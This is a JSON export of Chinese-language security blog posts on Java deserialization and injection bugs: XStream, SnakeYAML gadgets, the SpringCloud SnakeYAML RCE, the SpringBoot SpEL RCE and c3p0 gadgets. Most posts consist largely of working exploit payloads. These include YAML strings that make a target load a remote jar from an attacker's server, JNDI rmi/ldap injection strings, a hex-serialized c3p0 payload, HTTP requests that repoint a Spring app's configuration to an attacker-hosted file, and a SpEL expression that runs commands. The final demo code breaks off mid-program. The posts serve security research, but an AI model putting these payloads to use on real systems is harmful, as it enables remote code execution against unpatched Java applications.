&lt;string&gt;good&lt;/string&gt; &lt;/entry&gt;&lt;/tree-map&gt; 其他说明唯一与sorted-set有点区别的地方就是，在com.thoughtworks.xstream.converters.collections.TreeMapConverter#unmarshal，可以看到没有TreeSetConverter那么多的限制 在&lt;=1.3.1版本的当中 会报错显示TreeMap没有包含comparator元素，即不支持PoC中两个子标签元素调用compareTo()进行比较，因此无法利用 在1.4.7-1.4.9版本，ReflectionConverter.canConvert()函数中添加了对EventHandler类的过滤 参考文章https://paper.seebug.org/1543/#_1","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"XStream","slug":"XStream","permalink":"https://y4tacker.github.io/tags/XStream/"}]},{"title":"SnakeYAML实现Gadget探测","slug":"year/2022/2/SnakeYAML实现Gadget探测","date":"2022-02-08T15:20:17.000Z","updated":"2024-08-04T09:01:49.122Z","comments":true,"path":"2022/02/08/year/2022/2/SnakeYAML实现Gadget探测/","link":"","permalink":"https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%AE%9E%E7%8E%B0Gadget%E6%8E%A2%E6%B5%8B/","excerpt":"","text":"SnakeYAML实现Gadget探测@Y4tacker 思路来源今天在学习SnakeYAML的反序列化的时候，想到一个新的探测payload，网上之前有一个SPI那个链子可以有通过URLClassloader检测 1String poc = &quot;!!java.net.URL [null, \\&quot;[http://osrwbf.dnslog.cn](http://osrwbf.dnslog.cn/)\\&quot;]: 1&quot;; 这个的话主要是因为SnakeYAML在解析带键值对的集合的时候会对键调用hashCode方法因此会触发DNS解析 因此通过构造URL对象后面简单加个: 1让他成为一个mapping ，不过会触发多次，后面有个师傅具体更了下就直接放上来了 不管是set还是map，都会对URL触发两次hashCode() 第一次触发点是相同的，都是SafeConstructor.flatterMapping()–&gt;SafeConstructor.processDuplicateKeys() 第二次触发点是不同的，分别是 BaseConstructor.constructSet2ndStep() 和 BaseConstructor.constructMapping2ndStep() 实现探测Gadget不完美的构造这里再补充个探测gadget思路：：在刚刚的思路上实现了探测gadget，如果string存在才会接着触发URLDNS，不存在就不会 1String poc = &quot;key: [!!java.lang.String []: 0, !!java.net.URL [null, \\&quot;[http://5ydl3f.dnslog.cn](http://5ydl3f.dnslog.cn/)\\&quot;]: 1]&quot;; 2016年1月，snakeyaml的Constructor.java提交了一个commit，把ConstructSequence#construct() 里面的node.getType().getConstructors()改成了node.getType().getDeclaredConstructors()。所以从1.17版本开始，这个才可以探测private构造函数的类了，详情见 https://github.com/snakeyaml/snakeyaml/commit/d1df711e244323f2d05becb184863fd6333525cd 当然上面的payload又遇到了问题，如果对象的构造方法私有化就不行，为什么呢看下文 更完善的方案影响版本：1.7-1.30目前最新 在1.7版本前的org.yaml.snakeyaml.constructor.Constructor.ConstructMapping#createEmptyJavaBean不是通过反射因此也是不行 解决方案是 1String poc = &quot;key: [!!java.lang.String &#123;&#125;: 0, !!java.net.URL [null, \\&quot;[http://5ydl3f.dnslog.cn](http://5ydl3f.dnslog.cn/)\\&quot;]: 1]&quot;; 这个与上面的区别不一样在于探测的类后面[]或{}对应的分别是ConstructSequence与ConstructMapping，光这样说还是不够清楚，就详细来说，可以看到org.yaml.snakeyaml.constructor.Constructor.ConstructSequence#construct的处理逻辑如下，我们只看最关键的地方 可以看到这里获取构造函数调用的是node.getType().getConstructors()，也就是只会获得公有的构造函数，因此会出错 如果换成了&#123;&#125;则会调用org.yaml.snakeyaml.constructor.Constructor.ConstructMapping#construct 这里首先调用createEmptyJavaBean实例化对象，可以看到这里是getDeclaredConstructor就算是私有也Ok 123456789protected Object createEmptyJavaBean(MappingNode node) &#123; try &#123; java.lang.reflect.Constructor&lt;?&gt; c = node.getType().getDeclaredConstructor(); c.setAccessible(true); return c.newInstance(); &#125; catch (Exception var3) &#123; throw new YAMLException(var3); &#125;&#125; 那么你会好奇如果我想要调用带参数的构造函数怎么办，那肯定不行，那SnakeYAML如何处理的呢也就是后面调用了，constructJavaBean2ndStep，与本文探测问题无关，简单来说其实就是在while循环里不断通过反射设置值 总结有时候细节也确实很重要，昨晚匆匆忙忙却忽略了很多细节，说起来也是惭愧","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"SnakeYAML","slug":"SnakeYAML","permalink":"https://y4tacker.github.io/tags/SnakeYAML/"}]},{"title":"SnakeYAML反序列化及可利用Gadget","slug":"year/2022/2/SnakeYAML反序列化及可利用Gadget分析","date":"2022-02-08T02:32:41.000Z","updated":"2024-08-04T09:01:49.113Z","comments":true,"path":"2022/02/08/year/2022/2/SnakeYAML反序列化及可利用Gadget分析/","link":"","permalink":"https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/","excerpt":"","text":"SnakeYAML反序列化及可利用GadgetSnakeYaml简介YAML是”YAML Ain’t a Markup Language”（YAML不是一种标记语言）的递归缩写，是一个可读性高、用来表达数据序列化的格式，类似于XML但比XML更简洁。 在Java中，有一个用于解析YAML格式的库，即SnakeYaml。 SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8/UTF-16，支持Java对象的序列化/反序列化，支持所有YAML定义的类型。 当然在分析之前还得了解YAML的语法格式，具体可以百度看看，这里不放了 使用SnakeYaml进行序列化和反序列化SnakeYaml提供了Yaml.dump()和Yaml.load()两个函数对yaml格式的数据进行序列化和反序列化。 Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个Java对象； Yaml.dump()：将一个对象转化为yaml文件形式； Yaml.load()，经过我的测试当不存在某个属性，或者存在属性但是不是由public修饰的时候会调用set方法，这里不想放图了自己玩玩吧 123456789101112131415161718192021222324252627282930313233343536373839public class TestBean &#123;// static &#123;// try &#123;// Runtime.getRuntime().exec(&quot;open -na Calculator&quot;);// &#125;catch (Exception e)&#123;//// &#125;// &#125; protected String name; private String test; public String tt; String abc; public TestBean()&#123; System.out.println(&quot;构造方法&quot;); &#125; public void setName(String name) &#123; System.out.println(&quot;setName&quot;); this.name = name; &#125; public void setTest(String test) &#123; System.out.println(&quot;setTest&quot;); this.test = test; &#125; public void setTt(String tt) &#123; System.out.println(&quot;setTt&quot;); this.tt = tt; &#125; public void setAbc(String abc) &#123; System.out.println(&quot;setAbc&quot;); this.abc = abc; &#125;&#125; 之后调用 12Yaml yaml = new Yaml();yaml.load(&quot;!!TestBean &#123;name: abc, test: aa, tt: jj, abc: def&#125;&quot;); 至于为什么Public不能调用set方法，简单说一下在后面调用constructJavaBean2ndStep()函数，其中会获取yaml格式数据中的属性的键值对，然后调用propert.set()来设置新建的目标对象的属性值，而这个Property的设置在org.yaml.snakeyaml.introspector.PropertyUtils#getPropertiesMap 可以看到这个如果是Public修饰的话，后面会调用org.yaml.snakeyaml.introspector.FieldProperty#get，这个只是反射获取值 而如果是MethodProperty.set()函数，则就是通过反射机制来调用目标类name属性的setter方法来进行属性值的设置 SnakeYaml反序列化过程调试分析当然既然SnakeYaml这个库也不认为反序列化一些类是漏洞那么我也不会去详细的了解每一步，至少感觉做到知道有这个类以后能够如何利用了 在load()函数中会先生成一个StreamReader，将yaml数据通过构造函数赋给StreamReader，再调用loadFromReader()函数： 在loadFromReader()函数中，调用了BaseConstructor.getSingleData()函数，此时type为java.lang.Object，指定从yaml格式数据中获取数据类型是Object类型： 跟进getSingleData()函数中，先创建一个Node对象（其中调用getSingleNote()会根据流来生成一个文件，即将字符串按照yaml语法转为Node对象），然后判断当前Node是否为空且是否Tag为空，若不是则判断yaml格式数据的类型是否为Object类型、是否有根标签，这里都判断不通过，最后返回调用constructDocument()函数的结果： 在getClassForNode()函数中，先根据tag取出className为目标类，然后调用getClassForName()函数获取到具体的类： 还有个小细节就是getClassForName可以初始化静态块里面的函数 调用construct()函数实例化类对象 进一步跟进constructJavaBean2ndStep()函数，其中会获取yaml格式数据中的属性的键值对，然后调用propert.set()来设置新建的目标对象的属性值，这里上面已经提过了也就没啥好说的了，整个利用链也有了，分析完毕 可利用的Gadget1.利用SPI机制-基于ScriptEngineManager利用链1!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://127.0.0.1/a.jar&quot;]]]] 利用栈 12345678910111213141516171819newInstance:396, Class (java.lang)nextService:380, ServiceLoader$LazyIterator (java.util)next:404, ServiceLoader$LazyIterator (java.util)next:480, ServiceLoader$1 (java.util)initEngines:122, ScriptEngineManager (javax.script)init:84, ScriptEngineManager (javax.script)&lt;init&gt;:75, ScriptEngineManager (javax.script)newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:62, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:423, Constructor (java.lang.reflect)construct:557, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)construct:341, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)constructObject:182, BaseConstructor (org.yaml.snakeyaml.constructor)constructDocument:141, BaseConstructor (org.yaml.snakeyaml.constructor)getSingleData:127, BaseConstructor (org.yaml.snakeyaml.constructor)loadFromReader:450, Yaml (org.yaml.snakeyaml)load:369, Yaml (org.yaml.snakeyaml)main:10, Demo (BasicKnow.SnakeymlUnser) 2.JdbcRowSetImpl1String poc = &quot;!!com.sun.rowset.JdbcRowSetImpl\\n dataSourceName: \\&quot;ldap://localhost:1389/Exploit\\&quot;\\n autoCommit: true&quot;; 当然也可以写成 1String poc = &quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: \\&quot;rmi://127.0.0.1:1099/Exploit\\&quot;, autoCommit: true&#125;&quot;; 我们知道利用链是setDataSourceName-&gt;setAutoCommit， 可以看到修饰符 1private String dataSource; 因此可以触发，不多说了太简单了 3.Spring PropertyPathFactoryBean简单测试下能拿下整个版本到2.6.3最新版都行，不过也很好理解 12345String poc = &quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean\\n&quot; +&quot; targetBeanName: \\&quot;rmi://127.0.0.1:1099/Exploit\\&quot;\\n&quot; +&quot; propertyPath: y4tacker\\n&quot; +&quot; beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\\n&quot; +&quot; shareableResources: [\\&quot;rmi://127.0.0.1:1099/Exploit\\&quot;]&quot;; 或者一行拿下 1String poc = &quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean &#123;targetBeanName: \\&quot;rmi://127.0.0.1:1099/Exploit\\&quot;, propertyPath: \\&quot;y4tacker\\&quot;, beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory &#123;shareableResources: [\\&quot;rmi://127.0.0.1:1099/Exploit\\&quot;]&#125;&#125;&quot;; 可以看到在org.springframework.beans.factory.config.PropertyPathFactoryBean#setBeanFactory 这里网上流传版本找到个org.springframework.jndi.support.SimpleJndiBeanFactory，其调用getBean的时候会触发JNDI注入，当然这里还有个限制是this.beanFactory.isSingleton(this.targetBeanName) 也很好绕过设置shareableResources即可 4.Apache XBean依赖，当然版本没限制 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt; &lt;artifactId&gt;xbean-naming&lt;/artifactId&gt; &lt;version&gt;4.20&lt;/version&gt;&lt;/dependency&gt; 1String poc = &quot;!!javax.management.BadAttributeValueExpException [!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\\&quot;foo\\&quot;,!!javax.naming.Reference [\\&quot;foo\\&quot;, \\&quot;TouchFile\\&quot;, \\&quot;http://yourVps/\\&quot;],!!org.apache.xbean.naming.context.WritableContext []]]&quot;; 原因在于org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding继承了Binding 如果能触发其toString函数即可调用org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding#getObject，在调用到org.apache.xbean.naming.context.ContextUtil#resolve时 看到这个就不陌生了，太熟悉了，甚至不允许远程调用的时候也能尝试找ObjectFactory绕过 5.C3P0 JndiRefForwardingDataSource比较简单放个poc就行了 123String poc = &quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\\n&quot; +&quot; jndiName: \\&quot;rmi://localhost/Exploit\\&quot;\\n&quot; +&quot; loginTimeout: 0&quot;; 或者 1String poc = &quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource &#123;jndiName: \\&quot;rmi://localhost/Exploit\\&quot;, loginTimeout: \\&quot;0\\&quot;&#125;&quot;; 不过还是简单说一下，com.mchange.v2.c3p0.JndiRefForwardingDataSource#setLoginTimeout 调用了this.inner()里面又调用了this.dereference()，最终触发JNDI注入 6.C3P0 WrapperConnectionPoolDataSource123String poc = &quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\n&quot; +&quot; userOverridesAsString: \\&quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383030302f740003466f6f;\\&quot;&quot;; 很简单C3P0的二次反序列化payload，不多说了 7.Apache Commons Configuration引入依赖测试 12345&lt;dependency&gt; &lt;groupId&gt;commons-configuration&lt;/groupId&gt; &lt;artifactId&gt;commons-configuration&lt;/artifactId&gt; &lt;version&gt;1.10&lt;/version&gt;&lt;/dependency&gt; 触发payload是这个 12String poc = &quot;set:\\n&quot; + &quot; ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \\&quot;rmi://127.0.0.1:1099/Exploit\\&quot;]]&quot;; 网上搜了一下 1? 号： 针对较为复杂的对象格式 但是在理解了原理以后才知道，搞复杂了，实际上下面这个payload也可以 1poc = &quot;!!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \\&quot;rmi://127.0.0.1:1099/Exploit\\&quot;]]: 1&quot;; 主要是触发的时候是利用key调用hashCode方法所产生的利用链，还是简单说下调用链吧 在对ConfigurationMap调用hashCode的时候实际上是执行了,java.util.AbstractMap#hashCode 1234567public int hashCode() &#123; int h = 0; Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator(); while (i.hasNext()) h += i.next().hashCode(); return h;&#125; 之后会调用org.apache.commons.configuration.ConfigurationMap#entrySet的iterator方法，也就是org.apache.commons.configuration.ConfigurationMap.ConfigurationSet#iterator 之后就可以配合JNDIConfiguration实现jndi注入 1234lookup:417, InitialContext (javax.naming)getBaseContext:452, JNDIConfiguration (org.apache.commons.configuration)getKeys:203, JNDIConfiguration (org.apache.commons.configuration)getKeys:182, JNDIConfiguration (org.apache.commons.configuration) 探测SnakeYAML突然想到一个新的探测payload，之前上面有一个SPI那个链子可以有通过URLClassloader检测 1String poc = &quot;!!java.net.URL [null, \\&quot;[http://osrwbf.dnslog.cn](http://osrwbf.dnslog.cn/)\\&quot;]: 1&quot;; 这个的话主要是因为SnakeYAML在解析带键值对的集合的时候会对键调用hashCode方法因此会触发DNS解析，因此通过构造URL对象后面简单加个: 1让他成为一个mapping","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"SnakeYAML","slug":"SnakeYAML","permalink":"https://y4tacker.github.io/tags/SnakeYAML/"}]},{"title":"SpringCloud-SnakeYAML-RCE","slug":"year/2022/2/SpringCloud-SnakeYAML-RCE","date":"2022-02-08T02:01:51.000Z","updated":"2024-08-04T09:01:49.127Z","comments":true,"path":"2022/02/08/year/2022/2/SpringCloud-SnakeYAML-RCE/","link":"","permalink":"https://y4tacker.github.io/2022/02/08/year/2022/2/SpringCloud-SnakeYAML-RCE/","excerpt":"","text":"SpringCloud-SnakeYAML-RCE利用条件Ps：支持/env的post的好像必须要springCloud，springBoot我怎么都不可以搜了网上一堆也不行，有大佬知道可以说说为什么 可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标依赖的 spring-cloud-starter 版本 &lt; 1.3.0.RELEASE 目标可以请求攻击者的 HTTP 服务器（请求可出外网） 漏洞复现1.在网站根目录下放置后缀为 yml 的文件 example.yml，内容如下 12345!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [&quot;http://your-vps-ip/example.jar&quot;] ]]] 2.准备一个恶意jar，实现SPI，很简单如下 3.设置 spring.cloud.bootstrap.location 属性 spring1.x 1234POST /envContent-Type: application/x-www-form-urlencodedspring.cloud.bootstrap.location=http://your-vps-ip/example.yml spring2.x 1234POST /actuator/envContent-Type: application/json&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;&#125; 4.刷新配置 spring 1.x 12POST /refreshContent-Type: application/x-www-form-urlencoded spring 2.x 12POST /actuator/refreshContent-Type: application/json 漏洞原理从过程中我们知道，命令执行是由于 SnakeYAML 在解析 YAML 文件时，存在反序列化漏洞导致，这个在我博客其他文章就有提过了，这里就不再多说 看几个关键的地方，处理 /refresh 接口请求的类在org.springframework.cloud.endpoint.RefreshEndpoint#refresh 第二个是 BootstrapApplicationListener.bootstrapServiceContext() 方法，这里从环境变量中获取到了 spring.cloud.bootstrap.location 的值 最后在 org.springframework.boot.env.PropertySourcesLoader.load() 方法，根据文件名后缀 (yml) ，使用 YamlPropertySourceLoader 类加载 url 对应的 yml 配置文件，因 spring-beans.jar 包含 snakeyaml.jar，因此 YamlPropertySourceLoader 在默认情况下是使用 SnakeYAML 库解析配置 高版本无效在Spring1.x版本当中 1234567891011121314151617181920212223242526private StandardEnvironment copyEnvironment(ConfigurableEnvironment input) &#123; StandardEnvironment environment = new StandardEnvironment(); MutablePropertySources capturedPropertySources = environment.getPropertySources(); Iterator var4 = capturedPropertySources.iterator(); PropertySource source; while(var4.hasNext()) &#123; source = (PropertySource)var4.next(); capturedPropertySources.remove(source.getName()); &#125; var4 = input.getPropertySources().iterator(); while(var4.hasNext()) &#123; source = (PropertySource)var4.next(); capturedPropertySources.addLast(source); &#125; environment.setActiveProfiles(input.getActiveProfiles()); environment.setDefaultProfiles(input.getDefaultProfiles()); Map&lt;String, Object&gt; map = new HashMap(); map.put(&quot;spring.jmx.enabled&quot;, false); map.put(&quot;spring.main.sources&quot;, &quot;&quot;); capturedPropertySources.addFirst(new MapPropertySource(&quot;refreshArgs&quot;, map)); return environment; &#125; 在Spring2.x版本当中，却有限制 1234567891011121314151617181920212223242526private StandardEnvironment copyEnvironment(ConfigurableEnvironment input) &#123; StandardEnvironment environment = new StandardEnvironment(); MutablePropertySources capturedPropertySources = environment.getPropertySources(); String[] var4 = DEFAULT_PROPERTY_SOURCES; int var5 = var4.length; for(int var6 = 0; var6 &lt; var5; ++var6) &#123; String name = var4[var6]; if (input.getPropertySources().contains(name)) &#123; if (capturedPropertySources.contains(name)) &#123; capturedPropertySources.replace(name, input.getPropertySources().get(name)); &#125; else &#123; capturedPropertySources.addLast(input.getPropertySources().get(name)); &#125; &#125; &#125; environment.setActiveProfiles(input.getActiveProfiles()); environment.setDefaultProfiles(input.getDefaultProfiles()); Map&lt;String, Object&gt; map = new HashMap(); map.put(&quot;spring.jmx.enabled&quot;, false); map.put(&quot;spring.main.sources&quot;, &quot;&quot;); map.put(&quot;spring.main.web-application-type&quot;, &quot;NONE&quot;); capturedPropertySources.addFirst(new MapPropertySource(&quot;refreshArgs&quot;, map)); return environment; &#125; 必须在DEFAULT_PROPERTY_SOURCES当中的才能被添加到propertySourceList，而恰好 1private static final String[] DEFAULT_PROPERTY_SOURCES = new String[]&#123;&quot;commandLineArgs&quot;, &quot;defaultProperties&quot;&#125;; 结论 Spring Boot 2.x 无法利用成功 Spring Boot 1.5.x 在使用 Dalston 版本时可利用成功，使用 Edgware 无法成功 Spring Boot &lt;= 1.4 可利用成功","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"SnakeYAML","slug":"SnakeYAML","permalink":"https://y4tacker.github.io/tags/SnakeYAML/"}]},{"title":"低版本SpringBoot-SpEL表达式注入漏洞复现分析","slug":"year/2022/2/低版本SpringBoot-SpEL表达式注入漏洞复现分析","date":"2022-02-07T08:19:51.000Z","updated":"2024-08-04T09:01:49.175Z","comments":true,"path":"2022/02/07/year/2022/2/低版本SpringBoot-SpEL表达式注入漏洞复现分析/","link":"","permalink":"https://y4tacker.github.io/2022/02/07/year/2022/2/%E4%BD%8E%E7%89%88%E6%9C%ACSpringBoot-SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/","excerpt":"","text":"低版本SpringBoot-SpEL表达式注入漏洞复现分析影响版本SpringBoot 1.1.0-1.1.12SpringBoot 1.2.0-1.2.7SpringBoot 1.3.0 利用条件是使用了springboot的默认错误页(Whitelabel Error Page)，漏洞点在：org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration 触发原因在SpringBoot的自定义错误页面，功能是页面返回错误，并提供详细信息，信息中包括错误status（”status”-&gt;500）、时间戳（”timestamp”-&gt;”Fri Dec…..”）、错误信息（”error”-&gt;”Internal Server Error”）、和用户输入的参数（”message”-&gt;”abcd”），这些参数在模板文件中以类似于以下形式存在：”Error 1234 ${status}—${timestamp}—${error}—${message}“。 关于漏洞的原理： spring boot 处理参数值出错，流程进入 org.springframework.util.PropertyPlaceholderHelper 类中 此时 URL 中的参数值会用 parseStringValue 方法进行递归解析 其中 $&#123;&#125; 包围的内容都会被 org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration 类的 resolvePlaceholder 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞 但主要的原因在于这里使用了递归，也就是说如果参数名中还包含${和}的话，这个解析引擎会再次递归一次，再次解析这个值，如，模板中有个值为${${abc}}，由于使用了递归，解析引擎会对其解析两次，第一层去掉最外层的{}解析成${abc}，然后将其作为参数进行第二次解析。在第二次解析中将里层的{}去掉，变成abc 分析简简单单写个抛出异常的控制器即可，这里访问下面这个url，页面当中就会出现36 1http://127.0.0.1:8080/?test=$&#123;6*6&#125; 12345678public String abc(HttpServletRequest request)&#123; try &#123; throw new NullPointerException(request.getParameter(&quot;cmd&quot;)); &#125;catch (Exception e)&#123; &#125; 进入正题，在org.springframework.util.PropertyPlaceholderHelper#parseStringValue 首先会提取出$&#123;&#125;当中的内容，这里第一个是从模板里取出的所以只能是timestamp\\error\\status\\message 以timestamp为例子，这里在得到SpEL解析的结果后下面还会再对这个值继续进行SpEL表达式解析，很骚，调用的是parseStringValue，也就是一个递归的过程因此造成了SpEL的递归解析因此最终导致漏洞的产生，知道这个过程以后我们甚至可以让payload变得更难被探测，比如$&#123;$&#123;1*2&#125;*6&#125;会返回12 由字符串格式转换成 0x** java 字节形式，方便执行任意代码： 1234567# coding: utf-8result = &quot;&quot;target = &#x27;open -a Calculator&#x27;for x in target: result += hex(ord(x)) + &quot;,&quot;print(result.rstrip(&#x27;,&#x27;)) 这里执行open -na Calculator 1$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72&#125;))&#125; 补丁分析补丁创建了一个新的NonRecursivePropertyPlaceholderHelper类，用于防止parseStringValue进行递归解析 参考文章https://www.jianshu.com/p/ce4ac733a4b9","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"SpEL","slug":"SpEL","permalink":"https://y4tacker.github.io/tags/SpEL/"}]},{"title":"c3p0的三个gadget的学习","slug":"year/2022/2/c3p0的三个gadget的学习","date":"2022-02-06T09:43:23.000Z","updated":"2024-08-04T09:01:49.161Z","comments":true,"path":"2022/02/06/year/2022/2/c3p0的三个gadget的学习/","link":"","permalink":"https://y4tacker.github.io/2022/02/06/year/2022/2/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget%E7%9A%84%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"c3p0的三个gadget的学习目前c3p0有三种方式getshell 加载远程类 jndi hex序列化字节加载器 前两个可以放在一起学习,在com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject，可以看到，如果是IndirectlySerialized的实例就会去调用getObject方法 123if (o instanceof IndirectlySerialized) &#123; o = ((IndirectlySerialized)o).getObject();&#125; 而它的实现类只有一个com.mchange.v2.naming.ReferenceIndirector.ReferenceSerialized，我们可以看看 触发jndi很明显如果contextName不为空，则会触发，这里没必要继续说下去了 加载远程类接下来是第二个，这也是ysoserial本身集成的一个payload，继续往下看，ReferenceableUtils.referenceToObject，也是很明显通过URLClassloader加载远程类，并且默认初始化了，因此可以直接在静态块里面放入恶意数据 关于writeObject的话，以ysoserial的为例，PoolSource implements ConnectionPoolDataSource, Referenceable，只要不实现序列化接口，并实现getReference方法返回我们的Reference对象即可，也是很简单的 hex序列化字节加载器这个更多会用到在fastjson，Snake YAML , JYAML,Yamlbeans , Jackson,Blazeds,Red5, Castor等里面配合使用 当在userOverridesAsString当中设置了序列化数据后，当调用set方法setUpPropertyListeners时就能触发，而这个监听器正好在设置完userOverridesAsString就会调用 可以看到里面对序列化数据的处理 123456789public static Map parseUserOverridesAsString(String userOverridesAsString) throws IOException, ClassNotFoundException &#123; if (userOverridesAsString != null) &#123; String hexAscii = userOverridesAsString.substring(&quot;HexAsciiSerializedMap&quot;.length() + 1, userOverridesAsString.length() - 1); byte[] serBytes = ByteUtils.fromHexAscii(hexAscii); return Collections.unmodifiableMap((Map)SerializableUtils.fromByteArray(serBytes)); &#125; else &#123; return Collections.EMPTY_MAP; &#125;&#125; 最后触发原生反序列化 后面才发现又个地方比较坑，在com.mchange.v2.c3p0.impl.C3P0ImplUtils#parseUserOverridesAsString 1String hexAscii = userOverridesAsString.substring(&quot;HexAsciiSerializedMap&quot;.length() + 1, userOverridesAsString.length() - 1); 这里会把最后一位吃了有点恶心，因此构造payload的时候要像这样 1String payload = &quot;HexAsciiSerializedMap:&quot;+HexString+&quot;:&quot;; 这里给个demo方便测试 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import com.govuln.deserialization.CB1;import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;import hudson.remoting.Base64;import javassist.ClassPool;import javassist.CtClass;import org.python.antlr.ast.Str;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.lang.reflect.Modifier;import java.util.HashSet;import java.util.LinkedList;import java.util.PriorityQueue;public class Test &#123; public static byte[] toByteArray(InputStream in) throws IOException &#123; byte[] classBytes; classBytes = new byte[in.available()]; in.read(classBytes); in.close(); return classBytes; &#125; public static String bytesToHexString(byte[] bArray, int length) &#123; StringBuffer sb = new StringBuffer(length); for(int i = 0; i &lt; length; ++i) &#123; String sTemp = Integer.toHexString(255 &amp; bArray[i]); if (sTemp.length() &lt; 2) &#123; sb.append(0); &#125; sb.append(sTemp.toUpperCase()); &#125; return sb.toString(); &#125; public static void main(String[] args) throws Exception &#123; byte[] data = CB1.getPayload(); String HexString = bytesToHexString(data, data.length); System.out.println(HexString.length()); String payload = &quot;HexAsciiSerializedMap:&quot;+HexString+&quot;:&quot;; WrapperConnectionPoolDataSource wrapperConnectionPoolDataSource = new WrapperConnectionPoolDataSource(); wrapperConnectionPoolDataSource.setUserOverridesAsString(payload); 